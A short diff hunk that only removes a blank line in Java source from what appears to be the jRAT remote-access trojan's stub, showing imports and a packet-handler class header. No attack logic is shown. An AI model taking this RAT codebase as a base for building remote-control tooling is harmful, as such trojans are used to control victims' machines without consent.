@@ -4,7 +4,6 @@ import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet34CustomDirectory;
 
-
 public class Packet41SpecialDirectory extends AbstractIncomingPacket {
 
 	@Override
